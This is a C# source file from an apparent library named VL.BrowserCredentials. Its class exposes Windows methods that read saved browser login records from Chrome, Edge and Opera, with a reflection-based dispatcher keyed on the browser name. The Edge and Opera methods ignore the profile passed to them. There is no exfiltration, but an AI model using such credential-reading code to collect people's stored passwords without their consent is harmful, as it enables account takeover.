using System.Reflection;
using System.Runtime.Versioning;
using VL.BrowserCredentials.Browsers;
using VL.BrowserCredentials.Readers;
using VL.BrowserCredentials.Tables;

namespace VL.BrowserCredentials.EncryptionDecryption
{

    public class SqliteRecordsProvider
    {

        private SqliteRecordsProvider() { }

        [SupportedOSPlatform("windows")]
        public static IEnumerable<Logins>? SelectLoginsRecordsFromGoogleChrome(string profile)
        {
            return LoginsReader.SelectLoginsRecordsFromChromium(BrowserSettingsFactory.GoogleChromeSettings, profile);
        }

        [SupportedOSPlatform("windows")]
        public static IEnumerable<Logins>? SelectLoginsRecordsFromMicrosoftEdge(string profile)
        {
            _ = profile;
            return LoginsReader.SelectLoginsRecordsFromChromium(BrowserSettingsFactory.MicrosoftEdgeSettings, "Default");
        }

        [SupportedOSPlatform("windows")]
        public static IEnumerable<Logins>? SelectLoginsRecordsFromOpera(string profile)
        {
            _ = profile;
            return LoginsReader.SelectLoginsRecordsFromChromium(BrowserSettingsFactory.OperaSettings);
        }

        [SupportedOSPlatform("windows")]
        public static IEnumerable<Logins>? SelectLoginsRecordsFrom(string browser, string profile)
        {
            var t = typeof(SqliteRecordsProvider);

            var method = t.GetMethod(nameof(SelectLoginsRecordsFrom) + browser, BindingFlags.Static | BindingFlags.Public);
            if (method is null) return null;

            var logins = method.Invoke(null, new string[] { profile });

            return (logins is null) ? null : (IEnumerable<Logins>)logins;
        }

    }

}
